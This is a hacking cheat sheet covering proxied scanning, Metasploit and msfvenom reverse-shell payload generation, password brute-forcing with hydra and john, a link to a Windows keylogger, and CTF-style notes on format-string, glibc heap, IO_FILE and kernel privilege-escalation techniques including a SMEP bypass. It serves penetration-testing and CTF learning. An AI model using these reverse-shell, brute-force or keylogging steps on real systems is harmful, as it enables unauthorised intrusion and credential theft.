# HackingCheatSheet
### outline
* Hacking Tools
	* [Proxychains](#Proxychains)
	* [Nmap](#Nmap)
	* [Nicto](#Nicto)
	* [Dirsearch](#Dirsearch)
	* [Exploitdb](#Exploitdb)	
	* [Metasploit](#Metasploit)
	* [Brute force password tools](#Password-crack)
	* [Hat Key](#HatKey)
* CTF Pwn Cheatsheet
	* [Build pwn environment with docker](#Environment)
	* [Format string payload](#FormatString)
	* [Linux heap mechanism](#LinuxHeap)
	* [Linux IO_FILE](#IO_FILE)
	* [Others](#Others)
* Linux Privilege Escalation
	* [Basic Knowlege](#Basic)
	* [Cred Structure](#Cred)
	* [Tty Structure](#TtyStructure)
	* [Kernel ROP](#KernelROP)
	* [ret2usr](#ret2usr)
	* [SMEP](#SMEP)
	* [Some Privilege Escalation trick](#OthersTrick)
* Reverse Shell
## Hacking Tools
### Proxychains 
Proxychains is a tool that could let us anonymous on the internet.
* Install On Ubuntu
```
1. git clone https://github.com/rofl0r/proxychains
2. cd proxychains
3. ./configure
4. make & make install  
```
* Install On MacOS
```
1. brew install proxychains-ng 
2. close SIP
   Reboot computer and prsee "Command + R" into recovery mode.
   Press Utilities -> Terminal (At upper left).
   Enter "csrutil disable".
   Reboot.
```
* Install Tor
```
Linux : sudo apt-get install tor
MacOS : download from "https://www.torproject.org/download/"
```
* Setting Config File  
File Path :  
 	Linux : /etc/proxychains.conf  
	MacOS : /usr/local/etc/proxychains.conf
```
# proxychains.conf  VER 4.x
#
#        HTTP, SOCKS4a, SOCKS5 tunneling proxifier with DNS.


# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
#strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#round_robin_chain
#
# Round Robin - Each connection will be done via chained proxies
# of chain_len length
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped).
# the start of the current proxy chain is the proxy after the last
# proxy in the previously invoked proxy chain.
# if the end of the proxy chain is reached while looking for proxies
# start at the beginning again.
# otherwise EINTR is returned to the app
# These semantics are not guaranteed in a multithreaded environment.
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain or round_robin_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns 

# set the class A subnet number to use for the internal remote DNS mapping
# we use the reserved 224.x.x.x range by default,
# if the proxified app does a DNS request, we will return an IP from that range.
# on further accesses to this ip we will send the saved DNS name to the proxy.
# in case some control-freak app checks the returned ip, and denies to 
# connect, you can use another subnet, e.g. 10.x.x.x or 127.x.x.x.
# of course you should make sure that the proxified app does not need
# *real* access to this subnet. 
# i.e. dont use the same subnet then in the localnet section
#remote_dns_subnet 127 
#remote_dns_subnet 10
remote_dns_subnet 224

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 80000

### Examples for localnet exclusion
## localnet ranges will *not* use a proxy to connect.
## Exclude connections to 192.168.1.0/24 with port 80
# localnet 192.168.1.0:80/255.255.255.0

## Exclude connections to 192.168.100.0/24
# localnet 192.168.100.0/255.255.255.0

## Exclude connections to ANYwhere with port 80
# localnet 0.0.0.0:80/0.0.0.0

## RFC5735 Loopback address range
## if you enable this, you have to make sure remote_dns_subnet is not 127
## you'll need to enable it if you want to use an application that 
## connects to localhost.
#localnet 127.0.0.0/255.0.0.0

## RFC1918 Private Address Ranges
# localnet 10.0.0.0/255.0.0.0
# localnet 172.16.0.0/255.240.0.0
# localnet 192.168.0.0/255.255.0.0

# ProxyList format
#       type  ip  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#       only numeric ipv4 addresses are valid
#
#
#        Examples:
#
#            	socks5	192.168.67.78	1080	lamer	secret
#		http	192.168.89.3	8080	justu	hidden
#	 	socks4	192.168.1.49	1080
#	        http	192.168.39.93	8080	
#		
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 	127.0.0.1 9050
socks5 	127.0.0.1 9150
```
* Usage
```
proxychains4 nmap www.example.com # Anonymous scanning the web server with nmap 
(When using MacOS remembering to open tor browser before using proxychains)
```
### Nmap
Scanning specific ports
```
nmap -p 80-200
```
Scanning opened port and service version
```
nmap "IP" --top-ports 1000 --open -sV
```
Scanning opened port and OS information 
```
nmap -O "IP"
```
Detect hosts that are powered on in this domain
```
nmap -sP "xxx.xxx.xxx.0/24"
```
### Nicto
This is a tool for scanning the web service version and the existing vulnerabilities.
* Usage 
```
nicto -h "Target IP" -p "Target Port"
```
### Dirsearch
It is a tool that could brute force directories and files in websites.
* Install & Usage
```
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python3 dirsearch.py -u "Web URL" -e *
```
### Exploitdb
This is an exploit database
* Usage
```
searchsploit linux 4 priv  # Searching existing exploit about "linux kernel 4.x privilege escalation"
```
### Metasploit
This is just an useful penetration test tool.
* Usage
```
search Apache 	# Searching the vulnerability about "Apache"
use XXXXXX    	# Using the exp
show options  	# Show the exp options
set XXX 	# Setting the options
exploit		# run the exp
```
* Meterpreter
This is a subservice in metasploit. It could help us create the malicious scripts.
```
msfvenom -p windows/meterpreter/reverse_tcp lhost="Your IP" lport="Your Port" -f reverseshell.exe
(Create a windows execute file for reversing shell)

msfvenom -p python/meterpreter/reverse_tcp LHOST="Your IP" LPORT="Your Port" -f pyterpreter.py
(Create a pyhton reverse shell script)
```
### Password-crack
/etc/shadow and /etc/passwd are the sensitive file in linux.
* john
```
john encrypted.txt --wordlist=rockyou.txt (this is a password dictionary file)
```
* hydra
It is a tool that could crack online password.
```
hydra -l "Target User Name" -P rockyou.txt "IP"
```
### HatKey
HatKey is a windows keylogger
```
git clone https://github.com/Naayouu/Hatkey.git
```
## CTF Pwn Cheatsheet
### Environment
* Pull ubuntu environment from dockerhub
```
docker pull ubuntu:19.04 # Selet linux version you want
docker run -i -t --name create_env ubuntu:19.04 bash
```
* Setuo docker image environment 
```
apt-get update
apt-get install vim 
apt-get install gdb
apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential
pip install pwntools
```
* Install peda & pwngdb
```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
git clone https://github.com/scwuaptx/Pwngdb.git 
cp ~/Pwngdb/.gdbinit ~/
```
* Install ROPgadget & one_gadget
```
pip install ropgadget 
apt-get install ruby
apt-get install gem
gem install one_gadget
```
* Install tmux
```
apt-get install tmux 
touch .tmux.conf 
echo "set -g mouse on" > .tmux.conf
```
* Create docker image & pwn container 
```
docker commit "Container ID" "Image Name"
docker run -it --privileged --name "Container Name" -v "Shared Folder Path" "Your Docker Image"
```
### FormatString
* Leak memory
```
"%N$s" + "got@xxx"
```
* Modify memory 
```
"%1768c%10$hn" + "some offset" + "got@xxx"    # 1768 = 0x6E8 , got@xxx : 0x7fxxxxxx06E8
```
### LinuxHeap
* Free inspection mechanism
```
if (__builtin_expect((uintptr_t) p > (uintptr_t) -size, 0) ||
	__builtin_expect(misaligned_chunk(p), 0)) {    // Check if address is aligned.
	errstr = "free(): invalid pointer";
errout:
	if (!have_lock && locked) __libc_lock_unlock(av->mutex);
	malloc_printerr(check_action, errstr, chunk2mem(p), av);
	return;
}

Check if address is aligned.
-> free(): invalid pointer 
```
```

if (__glibc_unlikely(size < MINSIZE || !aligned_OK(size))) { 
	errstr = "free(): invalid size";
	goto errout;
}

Check if size > MINSIZE or integer multiple of MALLOC_ALIGNMENT
-> free(): invalid size 
```
* Fast bin
```
7 bins
Size < 0x90 bytes
Single link list (LIFO)
Chunk fd point to next chunk head(not user data!!!)
When we free the fast bin chnuk P flag would "not" be setted to zero.
```
```
Address alignment weakness
When malloc fast bin, it will check if the size is correct.
Fasbin attack 
-> modify fd address and malloc it.
```
* fast bin free mechanism
```
if (have_lock || 
	({assert(locked == 0);__libc_lock_lock(av->mutex);
	locked = 1;
    chunksize_nomask(chunk_at_offset(p, size)) <= 2 * SIZE_SZ ||
    chunksize(chunk_at_offset(p, size)) >= av->system_mem;
    })) 
{
	errstr = "free(): invalid next size (fast)";
	goto errout;
}

Check if next size > (2 * SIZE_SZ)
Check if next size < system_mem(132k)
-> free(): invalid next size (fast)
```
```
if (__builtin_expect(old == p, 0)) {
	errstr = "double free or corruption (fasttop)";
	goto errout;
}

Check if chunk is the same as first chunk in fast bin 
-> double free or corruption (fasttop)
```
* Small bin
```
62 bins
Size : 0x20 ~ 0x3f0
Double link list (FIFO)
When we free the small bin chnuk P flag would be setted to zero.
```
* Large bin 
```
Size >= 0x400 bytes
Double link list
```
* Unsorted bin
```
If chunk size bigger then fast bin, it will be put in unsorted bin first.
If the chunk size we need doesn't in tcache and fast bin, chunk will be split from unsorted bin.
```
```
We could leak libc address by free chunk into unsorted bin.(fd & bk will point to main_arena)
Unsorted bin attack 
-> modify unsorted bin bk into &target-0x10 and malloc it. 
   Target address will be filled with a large number.
   (Before libc-2.28)
```
* Libc-2.29 malloc unsorted bin
```
bck = victim->bk;
size = chunksize (victim);
mchunkptr next = chunk_at_offset (victim, size);

if (__glibc_unlikely (size <= 2 * SIZE_SZ) || __glibc_unlikely (size > av->system_mem))
  malloc_printerr ("malloc(): invalid size (unsorted)");

if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ) 
		|| __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
 	malloc_printerr ("malloc(): invalid next size (unsorted)");

if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
	malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");

if (__glibc_unlikely (bck->fd != victim)
    || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
  malloc_printerr ("malloc(): unsorted double linked list corrupted");

if (__glibc_unlikely (prev_inuse (next)))
  malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");

-> 1. It will check if chunk size is legal.
   2. It will check if the next chunk size is legal.
   3. Check if size == next prev_size
   4. Check the double link list in unsorted bin is complete (Couldn't do unsorted bin attack)
   5. Check if the next chunk prev_inuse is zero
```
* Tcache
```
If chunk size <= 0x410, chunk will be freed into tcache first.
Tcache fd point to next chunk's user data(not chunk head!!!)
It doesn't check if size is legal when malloc 
It doesn't check double free(Before libc-2.29)
```
* libc-2.27 free tcache & malloc tcache
```
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

-> Doesn't check double free.

tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}

-> Doesn't check if size is legal
```
* Libc-2.29 free tcache & malloc tcache
```
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;	//new

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

-> If tcache bk point to chunk->key, it will check if there is double free.
   (If we could modify bk to others values, we could do double free)

tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  e->key = NULL;	//new
  return (void *) e;
}

-> Tcache bk will be filled with zero when malloc.
   It still doesn't check if size is legal.
```
* Libc-2.29 top chunk inspection 
```
if (__glibc_unlikely (size > av->system_mem))//0x21000
        malloc_printerr ("malloc(): corrupted top size");

-> Check if top chunk size is legal (couldn't do House Of Force)
```

### IO_FILE
* IO_FILE structure 
```
{
	0x0:'_flags',
	0x8:'_IO_read_ptr',
	0x10:'_IO_read_end',
	0x18:'_IO_read_base',
	0x20:'_IO_write_base',
	0x28:'_IO_write_ptr',
	0x30:'_IO_write_end',
	0x38:'_IO_buf_base',
	0x40:'_IO_buf_end',
	0x48:'_IO_save_base',
	0x50:'_IO_backup_base',
	0x58:'_IO_save_end',
	0x60:'_markers',
	0x68:'_chain',
	0x70:'_fileno',
	0x74:'_flags2',
	0x78:'_old_offset',
	0x80:'_cur_column',
	0x82:'_vtable_offset',
	0x83:'_shortbuf',
	0x88:'_lock',
	0x90:'_offset',
	0x98:'_codecvt',
	0xa0:'_wide_data',
	0xa8:'_freeres_list',430
	0xb0:'_freeres_buf',
	0xb8:'__pad5',
	0xc0:'_mode',
	0xc4:'_unused2',
	0xd8:'vtable'
}
```
* Hijack stdin to do arbitrary write
```
If we could hijack IO_FILE structure of stdin, we could modify _IO_buf_base and IO_buf_end
to do arbitrary write when call scanf(), IO_get_c, etc.

<_IO_2_1_stdin_>:       0x00000000fbad208b      0x00007ffff7fbca83
<_IO_2_1_stdin_+16>:    0x00007ffff7fbca83      0x00007ffff7fbca83
<_IO_2_1_stdin_+32>:    0x00007ffff7fbca83      0x00007ffff7fbca83
<_IO_2_1_stdin_+48>:    0x00007ffff7fbca83      "the begining address we wanna write"
<_IO_2_1_stdin_+64>:    "the end of address"	0x0000000000000000
<_IO_2_1_stdin_+80>:    0x0000000000000000      0x0000000000000000
```
* Hijack stdout to do arbitrary read for leaking memory
```
If we could hijack _flags and _IO_write_base , we are able to do arbitrary leak.

<_IO_2_1_stdout_>:       0x00000000fbad1800      0x0000000000000000
<_IO_2_1_stdout_+16>:    0x0000000000000000      0x0000000000000000
<_IO_2_1_stdout_+32>:    "address we wanna leak" 0x00007ffff7dd07e3
<_IO_2_1_stdout_+48>:    0x00007ffff7dd07e3      0x00007ffff7dd07e3
<_IO_2_1_stdout_+64>:    0x00007ffff7dd07e4      0x0000000000000000
<_IO_2_1_stdout_+80>:    0x0000000000000000      0x0000000000000000
```
### Others
* ASLR
```
Close ASLR:
echo 0 > /proc/sys/kernel/randomize_va_space

Open ASLR(Partial Random)：
echo 1 > /proc/sys/kernel/randomize_va_space

Open ASLR(Full Random)：
echo 2 > /proc/sys/kernel/randomize_va_space
```
* Some useful Linux command
```
readelf -S ./libc.so    # Check all segement offset in libc
readelf -s ./libc.so.6 | grep system    # Check function offset in libc 
```
```
strings ./libc.so | grep 2.    # Check libc version
ldd --version    # Check OS libc version
```
```
objdump -M intel -d "program_name"    # Reverse binary into assembly
```
```
uname -a    # Check OS version
cat /etc/*-release
```
* A good docker image for pwn(pwndocker)  
pwndocker : https://github.com/skysider/pwndocker.git  
How to change glibc in pwndocker ?
```
cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so
patchelf --set-interpreter /tmp/ld-2.27.so ./test
LD_PRELOAD=./libc.so.6 ./test

or

p = process(["/path/to/ld.so", "./test"], env={"LD_PRELOAD":"/path/to/libc.so.6"})
```
## Linux Privilege Escalation
### Basic
* How to change user to kernel
```
1. Swape register GS (By "swapgs").
2. Push rsp into CPU variable area. 
   Push address of kernel stack into rsp.
3. Push all registers to record status 
4. Call systme call handler in system call table.
```
* How to change kernel to user
```
1. Swape register GS (By "swapgs").
2. Call sysretq or iretq return to user.
```
* Some basic kernel functions
```
1. printk    # Print some kernel message(chekc by "dmesg")
2. copy_from_user(void *to, const void *from, unsigned long n);    # Copy message from user space
3. copy_to_user (void __user *to, const void *from, unsigned long n);    # Copy message to user space
4. kmalloc(size_t size, gfp_t flags)    # Allocate kernel memory
5. kfree (, const void * objp )    # Release kernel memory
6. commit_creds(prepare_kernel_cred(0))    # Do privilege escalation
```
* The address of "commit_creds()" & "prepare_kernel_cred()"
```
/proc/kallsyms
-> We could read this file to leak address.
```
### Cred
Cred is a kernel structure which record the process permission information.
("uid" and "gid" are the main targets of hackers)
```
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key	*session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	/* RCU deletion */
	union {
		int non_rcu;			/* Can we skip RCU deletion? */
		struct rcu_head	rcu;		/* RCU deletion hook */
	};
} __randomize_layout;
```
### TtyStructure
Tty_structure is an useful structure for pwn.  
When we open "/dev/ptmx" kernel will allocate an tty_structure,
If we could hijack the "tty_operations ops" to our malicious structure.
```
struct tty_struct {
    int magic;
    struct kref kref;
    struct device *dev;
    struct tty_driver *driver;
    const struct tty_operations *ops;    # This way is the main target !!!!!!!!!!!!!!!
    int index;
    /* Protects ldisc changes: Lock tty not pty */
    struct ld_semaphore ldisc_sem;
    struct tty_ldisc *ldisc;
    struct mutex atomic_write_lock;
    struct mutex legacy_mutex;
    struct mutex throttle_mutex;
    struct rw_semaphore termios_rwsem;
    struct mutex winsize_mutex;
    spinlock_t ctrl_lock;
    spinlock_t flow_lock;
    /* Termios values are protected by the termios rwsem */
    struct ktermios termios, termios_locked;
    struct termiox *termiox;    /* May be NULL for unsupported */
    char name[64];
    struct pid *pgrp;       /* Protected by ctrl lock */
    struct pid *session;
    unsigned long flags;
    int count;
    struct winsize winsize;     /* winsize_mutex */
    unsigned long stopped:1,    /* flow_lock */
              flow_stopped:1,
              unused:BITS_PER_LONG - 2;
    int hw_stopped;
    unsigned long ctrl_status:8,    /* ctrl_lock */
              packet:1,
              unused_ctrl:BITS_PER_LONG - 9;
    unsigned int receive_room;  /* Bytes free for queue */
    int flow_change;
    struct tty_struct *link;
    struct fasync_struct *fasync;
    wait_queue_head_t write_wait;
    wait_queue_head_t read_wait;
    struct work_struct hangup_work;
    void *disc_data;
    void *driver_data;
    spinlock_t files_lock;      /* protects tty_files list */
    struct list_head tty_files;
 #define N_TTY_BUF_SIZE 4096
    int closing;
    unsigned char *write_buf;
    int write_cnt;
    /* If the tty has a pending do_SAK, queue it here - akpm */
    struct work_struct SAK_work;
    struct tty_port *port;
} __randomize_layout;
```
```
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
 #ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
 #endif
    int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```

### KernelROP
```
----------------------
|Save status         |
----------------------
|pop rdi; ret;       |
----------------------
|0                   |
----------------------
|prepare_kernel_cred;|
----------------------
|mov rdi, rax;       |
----------------------
|commit_creds;       |
----------------------
|swapgs; ret;        |
----------------------
|iretq; ret;         |
----------------------
|system(/bin/sh);    |
----------------------

```
### ret2usr 
* Return to user space from kernel space
```
mov user_cs, cs;    # save status
mov user_ss, ss;
mov user_sp, rsp;
pushf;       
pop user_rflags;
swapgs; 
iretq;
```
```
swapgs;
sysretq;
```
### SMEP
SMEP is a kernel protection to avoid ret2usr.
If the program from kernel space access the user space memory, SMEP will tirgger an error.
* How to know if the SMEP is opened ?
```
If the 20th bit in CR4 is "1".
-> SMEP is opened !!!
```
* How to bypass ?
```
mov cr4, 0x1407e0;
```
```
mov cr4, 0x6f0
```
### OthersTrick

